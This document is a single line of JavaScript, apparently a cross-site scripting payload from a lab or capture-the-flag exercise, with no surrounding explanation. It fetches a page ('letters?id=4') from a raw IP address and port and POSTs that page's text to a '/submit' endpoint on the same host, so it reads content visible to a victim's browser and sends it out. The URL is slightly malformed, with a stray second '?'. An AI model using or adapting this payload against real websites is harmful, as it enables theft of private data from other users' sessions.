fetch('http://94.237.55.163:44028?letters?id=4').then(r => r.text()).then(t => fetch('http://94.237.55.163:44028/submit', {method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({message: t})}))
